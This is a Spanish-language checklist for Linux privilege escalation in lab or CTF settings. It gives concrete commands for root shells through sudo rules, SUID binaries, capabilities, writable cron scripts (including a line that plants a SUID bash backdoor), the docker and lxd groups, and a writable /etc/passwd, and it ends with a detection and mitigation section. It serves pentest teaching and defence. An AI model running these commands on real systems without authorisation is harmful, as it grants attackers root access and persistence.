---
title: Privesc Linux — sudo, SUID, capabilities y cron
tags: [linux, privesc, sudo, suid, gtfobins]
---

# Privesc Linux: la lista de comprobación

[🇬🇧 English](linux-sudo-suid.en.md) | **Español**

## 1. Contexto primero

```bash
id; sudo -n -l 2>/dev/null; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

Con eso ya se resuelven la mayoría de máquinas fáciles. Después: cron, servicios, ficheros escribibles y grupos.

## 2. `sudo`

```bash
sudo -l
```

Cada línea es una vía:

| Regla | Qué hacer |
|---|---|
| `(ALL) NOPASSWD: /usr/bin/vim` | `sudo vim -c ':!/bin/sh'` |
| `... /usr/bin/find` | `sudo find . -exec /bin/sh \; -quit` |
| `... /bin/systemctl` | `sudo systemctl` (pager → `!sh`) o `systemctl link` de una unit con `ExecStart=/bin/sh` + `enable --now` |
| `... /usr/bin/less` | `!sh` desde el paginador |
| `... /usr/bin/env` | `sudo env /bin/sh` |

GTFOBins es la referencia: busca el binario y el apartado **Sudo**. Cuidado con las reglas que permiten argumentos comodín: con `/usr/bin/awk *` la ejecución es directa, `sudo awk 'BEGIN {system("/bin/sh")}'`.

## 3. SUID y capabilities

```bash
find / -perm -4000 -type f 2>/dev/null | while read b; do echo "$b $(getcap "$b")"; done
```

- Binario estándar con SUID (`bash`, `find`, `nmap`, `cp`, `tar`): GTFOBins sección **SUID**.
- `bash -p` mantiene el euid; sin `-p` se cae.
- Capabilities: `cap_setuid+ep` en un intérprete es root inmediato; `cap_dac_read_search` permite leer `/etc/shadow`.
- Copia local: si el SUID está en un binario raro, descárgalo y mira `strings`/`ltrace`.

## 4. Cron y servicios

```bash
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
systemctl list-timers --all
ps aux --sort=-%cpu | head
```

Patrones: script escribible que corre como root, directorio de backup con permisos flojos, tarea que llama a un binario sin ruta absoluta (**PATH hijack**), o `tar`/`rsync` con wildcard (`--checkpoint-action=exec=sh`).

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh
```

## 5. Grupos y ficheros

- `docker`: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.
- `lxd`: publicar imagen y montar `/` con `security.privileged=true`.
- `disk`: `debugfs` sobre el disco para leer `/etc/shadow`.
- `adm`: leer logs; a veces hay credenciales.
- `/etc/passwd` escribible: añade usuario con hash conocido (uid 0).
- `.ssh` de otro usuario escribible: añade tu clave a `authorized_keys`.

## 6. Errores típicos

- **`sudo -l` pide contraseña y no la tienes** → prueba `sudo -n -l` y revisa `NOPASSWD`; si no, busca credenciales en ficheros de config.
- **GTFOBins no funciona** → la versión cambió el flag; comprueba `--help` del binario y adapta.
- **SUID en `/tmp` desaparece** → `nosuid` en el montaje; usa otro directorio.
- **El cron no se ejecuta** → `cron` parado, ruta relativa o el fichero no tiene `+x`.
- **Kernel exploit como primera opción** → riesgo de crash; déjalo para el final.

## 7. Detección y mitigación

- Auditar `sudoers` con `visudo -c` y revisar reglas `NOPASSWD` con comodines.
- Monitorizar SUID nuevos (`auditd` con `-p x`) y cambios en `cron`/`systemd`.
- Sacar a usuarios de `docker`, `lxd`, `disk` y `adm`; no dar `sudo` sobre intérpretes.
- Capacidades mínimas y revisión periódica con `getcap -r /`.

MITRE: T1548.003, T1548.001, T1053.003, T1611.
